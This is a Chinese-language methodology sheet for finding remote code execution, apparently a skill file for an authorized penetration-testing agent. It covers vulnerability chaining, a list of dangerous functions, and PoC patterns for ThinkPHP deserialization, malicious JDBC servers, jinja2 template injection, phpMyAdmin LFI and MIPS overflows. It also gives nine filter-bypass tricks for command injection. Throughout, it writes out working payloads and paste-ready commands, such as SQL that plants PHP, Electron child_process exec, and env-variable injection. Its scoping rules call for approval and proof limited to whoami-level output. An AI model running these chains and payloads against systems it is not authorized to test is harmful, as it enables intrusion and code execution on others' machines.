---
id: rce-hunting-map
title: RCE 挖掘系统化方法论（信号判据+组合拳决策树+白盒清单）
tags: RCE,方法论,组合拳,白盒,决策树,s4,s5
---
# RCE 挖掘系统化方法论

**定位**：把"找 RCE"从碰运气变成系统化路径——信号判据 → 组合拳决策树 → 白盒函数清单 → 可复用 PoC 模式。

## 一、黑盒信号判据（何时怀疑 RCE）

- 页面出现 ping/traceroute/连通性测试/nslookup → 80% 存在命令拼接；
- **多步交互功能**：先发包 A（记 sessionid）再发包 B——A 参数被过滤不代表 B 被过滤（换 B 的包重试）；
- 参数名特征：`cmd/call_function/flag=1`；回显常在 `<br><pre>` 后固定偏移。

## 二、组合拳决策树（单点打不通时凑链）

| 已有原语 | 组合 | 关键判据 |
|---|---|---|
| 未授权/任意登录 | + 后台 RCE 点 | shell_exec 前有登录判断即可，找硬编码密码进后台 |
| SQL 执行 | + 写权限 + 绝对路径 | into outfile；路径靠报错文件/phpinfo；SQLServer 直接 xp_cmdshell |
| SSRF | + 远程写入点 | readfile（SSRF 点）与 file_put_contents 同文件共存 → 构造 URL 下载 php 到 web 目录 |
| XXE | + PHP expect 扩展 | `<!ENTITY x SYSTEM "expect://id">` |
| 文件包含 | + 任意写 + mkdir | 白名单目录逐级 mkdir（`store=/tmp/x&isdisk=1` 两级）→ 写入 → 包含 |
| XSS | + Electron 客户端 | `require('child_process').exec`；判据=页面含 Electron 特征 |

## 三、白盒函数清单（有源码时全局搜索，按优先级）

命令执行：exec/system/shell_exec/passthru/反引号；写文件：**file_put_contents（双可控=RCE）**；包含：include/require（post 可控点）；目录：mkdir（dir 可控=越白名单）；反序列化链起点 `__destruct`、中继 `__toString/__call/call_user_func_array 首参可控/file_exists(对象触发 toString)`；环境变量：**putenv（envs 可控+后续任意 system=RCE，即使变量值"不可控"）**。Java 注意：`Runtime.exec` 不解析管道/分号（PHP 式拼接在 Java 报错），需全参数可控或 `cmd /c` 包裹 + `exec.waitFor()`。

## 四、可复用 PoC 模式（细节见对应技能）

- ThinkPHP 5.1.37 反序列化全链：`__destruct→removeFiles→file_exists(对象)→__toString→toArray（append 键名可控）→getAttr→__call→filter=system`；**序列化格式判据：private=%00类名%00属性（长度+2）、protected=%00*%00属性（长度+6）**；
- JDBC URL 可控：`queryInterceptors=...ServerStatusDiffInterceptor&autoDeserialize=true` + 假 MySQL 服务端逐报文应答（greeting hex→show session status 回 BLOB ysoserial 数据）；
- jinja2 自动爆破：遍历 `__subclasses__()` 按类名匹配（`_ModuleLock` 打印/`catch_warnings` 执行）生成 eval 链；
- phpMyAdmin 后台 LFI：建 `pma__userconfig` 表注入 config_data（session 路径 `\/..\/..\/tmp\/sess_【PHPSESSID】`）→ 清 Cookie 重登 → `?db=test` 两次触发包含；
- 溢出类（IoT/设备）：新旧固件 BinDiff 选差异函数（越红越好）→ sscanf 无长度限制→栈溢出→gdbserver+cyclic 定偏移→MIPS 无 NX 直接 shellcode，有空洞借 libc gadget 两级跳。

## 五、Bypass 九招（过滤时按序试）

变量拼接（a=c;b=a;c=t）、十六进制/八进制（$(printf "\154\163")）、函数拼接（sy.(st).em）、引号插入（c''a''t）、空参数（wh$1oami/ca${21}t）、未赋值变量（/etc$u/passwd）、通配符（??? /e??/?a????）、base64 管道、分隔符替换（%0a/%0d；PHP `?>` 代分号）。附 shell 符号速查：`|` 只执行 cmd2；`||` 失败才执行；`&` 顺序都执行；`&&` 成功才执行；`;` 顺序执行。

## 六、纪律

- 每个 RCE 候选先 update_coverage（证据=回显/OOB/文件落点三选一）；组合拳每环单独留证再串；
- POC 按 poc-template 编写并**限定影响证明**（id/whoami 级），不投放破坏载荷；批量利用仅限授权资产清单内。

### 行级细节补全

> **准入（v5.1）**：本节含真实写操作 PoC 原文（建库插数据/文件包含写入）——**全部属利用级动作，执行前必须获 SQL 写/文件写原语且经 S5 审批**；写入驻留按全域口径只登记移交不删除。与第六节「PoC 限定影响证明（id/whoami 级）」冲突时以更严口径为准。

Electron 最小两行：`const exec=require('child_process').exec; exec('calc.exe')`；`shell.openExternal` 可利用性低；网传 export function 写法实测不通。phpMyAdmin 后台 LFI 三步 SQL 原文（**S5 审批后**）：`CREATE DATABASE test; CREATE TABLE test.bar (baz VARCHAR(100) PRIMARY KEY); INSERT INTO test.bar SELECT '<?php phpinfo(); ?>';` → `CREATE TABLE pma__userconfig (id int, id2 int, config_data text, timevalue date, username char(50)) ENGINE=MyISAM;` → `INSERT INTO pma__userconfig VALUES(1,2,'{"DefaultTabDatabase":"\/..\/..\/Extensions\/tmp\/tmp\/sess_【PHPSESSID替换】","lang":"zh_CN"}',...,'root');` → 删 Cookie 重登 → `?db=test` 两次触发包含。文件包含组合拳参数名原文（**S5 审批后**）：`store=/tmp/app_auth&isdisk=1` → `store=/tmp/app_auth/cfile&isdisk=1` → 写入 `userName=../../tmp/app_auth/cfile/sb&auth=<?php phpinfo(); ?>` → 包含 `cf=sb.txt`。jinja2 自动脚本判据：`str(i.__attr__)[1:9]=='function'` + `neededFunction=['eval','open','exec']`；输出样例 `_ModuleLock`（print 验证）/`catch_warnings`（`__import__('os').popen('whoami').read()` 执行）。缓冲区溢出三判据：sscanf 格式串 `%[^;];%*[^=]=%[^\n]` 语义（无长度限制栈溢出）；到达条件 `cmac=MAC 格式+cip=IP 格式+submit_button 含 status_guestnet.asp`；**GET/POST 判据=只有 POST 打过去后台会转圈**。调试：gdbserver attach → cyclic 定偏移（85）→ MIPS 无 NX shellcode 直执行，有空洞借 libc gadget 两级跳（基址固定 `cat /proc/pid/maps`）。env 注入两条可粘贴验证命令：`ENV='$(id 1>&2)' dash -i -c 'echo hello'`；`env 'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"`。EXP 回显截取与批量法：`resp.text[resp.find('<br><pre>')+9:]` 即回显；批量=url.txt + with open 遍历。